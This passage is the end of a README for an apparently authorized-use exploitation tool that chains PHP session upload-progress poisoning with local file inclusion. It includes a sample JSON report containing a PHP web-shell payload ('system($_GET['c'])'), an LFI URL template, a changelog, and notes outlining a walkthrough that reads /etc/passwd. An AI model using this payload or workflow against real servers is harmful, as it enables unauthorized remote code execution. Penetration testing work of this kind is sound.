  "payload": "<?php $m=\"PFMARK_a8k2n9z1\";echo $m;system($_GET['c']);echo $m;?>",
  "lfi_template": "http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%",
  "race_http_status": 200,
  "race_note": "Normal response from upload endpoint",
  "lfi_hits": 1,
  "lfi_attempts": 47,
  "marker_pair_detected": true,
  "marker_output": "PHP_TRANSPORT_PROBE_OK",
  "execution_confirmed": false,
  "retry_after": null,
  "disabled_function_suspected": false,
  "notes": ["PHP version: 8.2.7"],
  "error": null,
  "timestamp": 1735219200
}
```

**The `payload` field is the exact string transmitted** — not a template.
This matters for reproducibility in reports.

---

## Changelog

### v0.4.0

- **Fix:** race socket failures no longer discard LFI hits
- **Fix:** `--retries` retries on transport errors
- **Fix:** `TCP_NODELAY` on every socket
- **Fix:** `1xx Continue` responses no longer misparsed
- **Fix:** duplicate `Cookie:` header when using `--header`
- **Fix:** `disable_functions=system` detected and flagged
- **Fix:** marker extraction uses last adjacent pair
- **Fix:** fingerprint fallback is body-aware
- **Fix:** `--param` / `--progress-field` / `--session-name` CRLF validation
- **Add:** `--session-name` for non-default PHP session names
- **Add:** `Verdict::NoLfi` and `Verdict::AuthRequired`
- **Add:** `--lfi-max-attempts` cap
- **Remove:** RCE verdict; two-marker hit now yields `UNCONFIRMED` (reflection cannot be excluded)
- **Add:** worker panic logging, LFI status logging at `-v`
- **Change:** `php_detected` is `Option<bool>`
- **Change:** banner prints after `clap` parse

### v0.3.0

- Initial public release

---

## References

- PHP manual, [`session.upload_progress`](https://www.php.net/manual/en/session.upload-progress.php)
- PHP manual, [`session.configuration`](https://www.php.net/manual/en/session.configuration.php)
- OWASP, [File Inclusion](https://owasp.org/www-community/attacks/File_Inclusion)
- PayloadsAllTheThings, [File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- PortSwigger, [File path traversal](https://portswigger.net/web-security/file-path-traversal)

---

## License

```
MIT License

Copyright (c) 2025 <your name>

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

See [LICENSE](LICENSE) for the full text.

---

<div align="center">

**Authorized security testing only. Authorized security testing only.**

**If you found a bug in prod, you were authorized.**
**If you weren't authorized, we can't help you.**

</div>
```

---

## Notes on this README

**Repetition strategy** — key points are repeated intentionally:

- **"Authorized security testing only"** — 4 times (legal section, banner, closing)
- **"Poison a session file, stall the upload, include the file with LFI"** — 2 times back to back
- **"The LFI must fire DURING the stall, not after"** — 2 times
- **"Payload in the value, not the filename"** — 2 times
- **"Two markers, not one"** — 2 times
- **"No LFI = no exploit"** — 2 times
- **"This build has no `CONFIRMED` verdict"** — 2 times
- **"Without `--lfi`, you have not tested anything"** — 3 times
- **"Paste this report into your deliverable"** — 2 times
- **"Learn them all"** (verdicts) — 2 times
- **"Follow the steps in order"** — 2 times
- **"Fix any incorrect values before sending"** — 2 times
- **"A report needs evidence"** — 2 times
- **"Repeat until both markers appear"** — 2 times
- **"Template must contain..."** — 2 times
- **"NoLfi is not Patched"** — 2 times

Each repetition appears as a standalone line so it survives skimming.

**Full usage guide** — the 7-step walkthrough is the centerpiece:

1. **Recon** — know your LFI before you touch the tool
2. **Dry run** — always dry-run first, no exceptions
3. **First attempt** — the exact command, with `%SID%`/`%CMD%`/`%PARAM%` explained
4. **Read verdict** — table mapping verdict → action
5. **Prove execution** — `id; hostname; uname -a; head /etc/passwd` + JSON report
6. **Retries/tuning** — 5 escalation paths when `UNCONFIRMED`
7. **Save report** — what evidence to keep

Every step tells you **what to do** and **why**, and most steps tell you
**what to check if it fails**.

**Companion files to add:**

| File | Purpose |
|---|---|
| `LICENSE` | MIT text |
| `.gitignore` | `target/`, `*.json` (but commit `Cargo.lock`) |
| `examples/docker-compose.yml` | `php:8.2-apache` + vulnerable `index.php` for dev/CI |
| `docs/engagement-template.md` | Report-ready write-up template |